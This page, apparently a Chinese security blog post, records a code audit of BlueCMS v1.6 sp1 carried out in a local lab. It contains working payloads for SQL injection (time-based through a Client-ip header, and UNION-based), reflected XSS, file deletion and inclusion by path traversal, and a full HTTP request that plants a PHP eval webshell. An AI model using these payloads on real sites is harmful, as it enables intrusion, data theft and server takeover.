@@ -1,0 +1,644 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>BlueCMS-v1-6-sp1代码审计 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="BlueCMS-v1-6-sp1代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-06-07 19:45" pubdate>
+        2020年6月7日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BlueCMS-v1-6-sp1代码审计</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    最近在学习代码审计，看到很久之前自己写关于bluecms-v1.6的代码审计的文章，写得什么玩意啊。随后决心重新开始写。</p>
+<h2 id="坚持以下下漏洞形成的条件"><a href="#坚持以下下漏洞形成的条件" class="headerlink" title="坚持以下下漏洞形成的条件"></a>坚持以下下漏洞形成的条件</h2><h3 id="1-可以控制的变量【一切输入都是有害的-】"><a href="#1-可以控制的变量【一切输入都是有害的-】" class="headerlink" title="1.可以控制的变量【一切输入都是有害的 】"></a>1.可以控制的变量【一切输入都是有害的 】</h3><h3 id="2-变量到达有利用价值的函数-危险函数-【一切进入函数的变量是有害的】"><a href="#2-变量到达有利用价值的函数-危险函数-【一切进入函数的变量是有害的】" class="headerlink" title="2.变量到达有利用价值的函数[危险函数]【一切进入函数的变量是有害的】"></a>2.变量到达有利用价值的函数[危险函数]【一切进入函数的变量是有害的】</h3><h1 id="2-全局分析"><a href="#2-全局分析" class="headerlink" title="2.全局分析"></a>2.全局分析</h1><p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/15.png" srcset="/img/loading.gif"></p>
+<p>从文件名可以看得出：/admin/是后台管理员才能进行访问的页面;/include是核心函数的存放的地方。</p>
+<p>进去目录看了一下，/data是存放一些配置文件的，比如连接数据库配置文件的。</p>
+<p>接下来看了一下首页文件，发现开头包含了/include目录下的两个文件。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/16.png" srcset="/img/loading.gif"></p>
+<p>跟进common.inc.php文件查看，发现又包含了许多文件。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png" srcset="/img/loading.gif"></p>
+<p>同时在代码30-36行，发现对用post/get方法传进来的参数进行了一些处理（如果GPC魔法方法没有开的话）</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png" srcset="/img/loading.gif"></p>
+<p>我们跟进deep_addslahes()方法进行查看。可以看到该方法是用addslashes()函数将每个传进来的参数进行处理。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png" srcset="/img/loading.gif"></p>
+<p>然后用seay审计工具去扫一下。看到有可能可以利用的漏洞，再进一步分析。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/26.png" srcset="/img/loading.gif"></p>
+<h1 id="3-漏洞挖掘与分析利用"><a href="#3-漏洞挖掘与分析利用" class="headerlink" title="3.漏洞挖掘与分析利用"></a>3.漏洞挖掘与分析利用</h1><p>目标：sql注入-&gt;xss注入-&gt;关于一些文件操作的漏洞-&gt;其他</p>
+<h2 id="1-insert-into-sql注入"><a href="#1-insert-into-sql注入" class="headerlink" title="1.insert into sql注入"></a>1.insert into sql注入</h2><h3 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>进行全局分析的时候，发现了一个特殊的点，在common.inc.php文件下代码45行的时候，我看到了一段调用了getip()方法的代码。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png" srcset="/img/loading.gif"></p>
+<p>跟进getip()，该方法在common.fun.php文件下，我们可以发现$ip的值我们可以控制的。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png" srcset="/img/loading.gif"></p>
+<p>进行全局搜索，看哪里有调用<code>getip()</code>，发现在comment.php文件下有一句sql语句调用了该函数，是直接调用该函数进行拼接的，所以可以进行sql注入。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/22.png" srcset="/img/loading.gif"></p>
+<p>往上面查看查看代码，查看利用到这段代码需要什么条件。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/23.png" srcset="/img/loading.gif"></p>
+<p>利用条件：</p>
+<p>1.$act==’send’。</p>
+<p>2.$id不能为空。</p>
+<p>3.$content也不能为空。</p>
+<p>跟踪这些变量，可以发现，这些变量我们都可以控制。</p>
+<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>这次打算利用以下形式进行注入（毕竟没用过）</p>
+<blockquote>
+<p>case</p>
+<p>when [condition1] then [result1],</p>
+<p>when [condition2] then [result2]</p>
+<p>………</p>
+<p>else [result3]</p>
+<p>end</p>
+<p>当条件一满足返回结果一</p>
+</blockquote>
+<p>payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/comment.php?act=send&amp;id=1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/comment.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UserName=reader; PassWord=1de9b0a30075ae8c303eb420c103c320; bdshare_firstime=1590232458206; PHPSESSID=3o2v5kgg1b73q7rmdtols0pjm3<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Client-ip</span><span class="hljs-punctuation">: </span>127.0.0.1&#x27;+(select case when(ascii(substr(database(),1,1))=98)then sleep(3) else 1 end),&#x27;1&#x27;)#<br><br>comment=1<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/24.png" srcset="/img/loading.gif"></p>
+<p>可以写一个python脚本去弄。</p>
+<p>类似漏洞还存在guest_book.php页面下，这里就不继续尝试了。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/25.png" srcset="/img/loading.gif"></p>
+<h2 id="2-union-sql注入"><a href="#2-union-sql注入" class="headerlink" title="2.union sql注入"></a>2.union sql注入</h2><h3 id="1-漏洞分析-1"><a href="#1-漏洞分析-1" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>漏洞代码在ad_js.php代码19行处，可以发现$ad_id用get方法获取后，直接拼接到sql语句中，并且没有单引号包裹。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/27.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:<code>?ad_id=-1 union select 1,2,3,4,5,6,user()</code></p>
+<p>然后查看源代码就行了</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/28.png" srcset="/img/loading.gif"></p>
+<h2 id="3-Union-sql注入2"><a href="#3-Union-sql注入2" class="headerlink" title="3.Union sql注入2"></a>3.Union sql注入2</h2><h3 id="1-漏洞分析-2"><a href="#1-漏洞分析-2" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>这个漏洞在admin/article.php的132行，我们可以看到从前端得到的id值直接拼接在sql语句并且执行了。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/29.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:<code>?act=del&amp;id=1 union select user(),2</code></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/30.png" srcset="/img/loading.gif"></p>
+<h2 id="4-Union-sql注入3"><a href="#4-Union-sql注入3" class="headerlink" title="4.Union sql注入3"></a>4.Union sql注入3</h2><h3 id="1-漏洞分析-3"><a href="#1-漏洞分析-3" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>漏洞在/admin/nav.php代码第65行处，又是从前端得到的参数值直接拼接的</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/31.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:<code>?act=edit&amp;navid=1 union select 1,database(),user(),4,@@datadir,6</code></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/32.png" srcset="/img/loading.gif"></p>
+<p>类似的sql漏洞在后台还有一堆，我就不一一写出来了。</p>
+<h2 id="5-反射型xss漏洞"><a href="#5-反射型xss漏洞" class="headerlink" title="5.反射型xss漏洞"></a>5.反射型xss漏洞</h2><h3 id="1-漏洞分析-4"><a href="#1-漏洞分析-4" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>漏洞代码在/admin/card.php第57行</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/33.png" srcset="/img/loading.gif"></p>
+<p>经过测试，利用条件如下：</p>
+<p>1.$act=do_edit</p>
+<p>2.$value/$price/$id不能为空。</p>
+<h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:<code>act=do_edit&amp;id=1&amp;value=1&amp;price=2&amp;name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/34.png" srcset="/img/loading.gif"></p>
+<h2 id="6-任意文件删除漏洞"><a href="#6-任意文件删除漏洞" class="headerlink" title="6.任意文件删除漏洞"></a>6.任意文件删除漏洞</h2><h3 id="1-漏洞分析-5"><a href="#1-漏洞分析-5" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>漏洞代码在publish.php文件下代码316行处，我们可以看到从前端得到的$id直接和BLUE_ROOT进行拼接，确认存在后，直接删除。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/35.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-5"><a href="#2-漏洞利用-5" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>在www目录下创建一个demo.txt进行测试</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/36.png" srcset="/img/loading.gif"></p>
+<p>payload:<code>?act=del_pic&amp;id=../demo.txt</code></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/37.png" srcset="/img/loading.gif"></p>
+<p>该cms类似的文件删除漏洞也是有一堆</p>
+<p>user.php下的957行</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/38.png" srcset="/img/loading.gif"></p>
+<p>user.php下的616行</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/39.png" srcset="/img/loading.gif"></p>
+<p>我就不一一列举了，都差不多。</p>
+<h2 id="7-任意文件包含漏洞"><a href="#7-任意文件包含漏洞" class="headerlink" title="7.任意文件包含漏洞"></a>7.任意文件包含漏洞</h2><h3 id="1-漏洞分析-6"><a href="#1-漏洞分析-6" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>漏洞在user.php第750行处，可以看到从前端得到的参数又是直接拼接了。但是后面也拼接了<code>/index.php</code>，想到可以采用<code>0x00截断</code>（查阅资料的时候，发现有一种文件长度截断方式）。通过查阅资料，发现<code>0x00</code>截断如果环境为5.4以上，该方法无效。这次搭建的环境是在linux上的，我用的php版本是php5.6，因此为了复现，我用虚拟机再搭建一个。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/40.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-6"><a href="#2-漏洞利用-6" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user.php?act=pay</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>636<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.103<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.103/user.php?act=pay<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=ed4db3762b9afa423831983d63af3742; BLUE[user_id]=2; BLUE[user_name]=reader; BLUE[user_pwd]=c5b37ecde112e31a81aab3f9f0c0174c; detail=1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br>pay=..%2F..%2Frobots.txt....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/41.png" srcset="/img/loading.gif"></p>
+<h2 id="8-后台写马getshell"><a href="#8-后台写马getshell" class="headerlink" title="8.后台写马getshell"></a>8.后台写马getshell</h2><h3 id="1-漏洞分析-7"><a href="#1-漏洞分析-7" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3><p>在/admin/tpl_manage.php代码54~59行，存在可以往一个文件读写的权限操作，并且操作的目标文件是我们可以控制的。</p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/42.png" srcset="/img/loading.gif"></p>
+<h3 id="2-漏洞利用-7"><a href="#2-漏洞利用-7" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/tpl_manage.php?act=do_edit HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">77</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">77</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">88</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1</span>/admin/tpl_manage.php<br><span class="hljs-attribute">Cookie</span>: UserName=reader; PassWord=<span class="hljs-number">1</span>de<span class="hljs-number">9</span>b<span class="hljs-number">0</span>a<span class="hljs-number">30075</span>ae<span class="hljs-number">8</span>c<span class="hljs-number">303</span>eb<span class="hljs-number">420</span>c<span class="hljs-number">103</span>c<span class="hljs-number">320</span>; bdshare_firstime=<span class="hljs-number">1590232458206</span>; BLUE[user_id]=<span class="hljs-number">2</span>; BLUE[user_name]=reader; BLUE[user_pwd]=<span class="hljs-number">738420</span>c<span class="hljs-number">093</span>b<span class="hljs-number">91</span>ed<span class="hljs-number">4</span>f<span class="hljs-number">5</span>cec<span class="hljs-number">7</span>e<span class="hljs-number">893615720</span>; PHPSESSID=lguerh<span class="hljs-number">54</span>nui<span class="hljs-number">13</span>utjs<span class="hljs-number">7</span>a<span class="hljs-number">18</span>hihg<span class="hljs-number">4</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">tpl_name</span>=../../shell.php&amp;tpl_content=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+%<span class="hljs-number">40</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B<span class="hljs-number">1</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/43.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/44.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/06/07/BlueCMS-v1-6-sp1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/45.png" srcset="/img/loading.gif"></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>这次审计是完完全全自己审计完的。审计的cms也比较简单，但还是花了不少时间。加油吧！</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/06/09/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B08/">
+                        <i class="iconfont icon-arrowleft"></i>
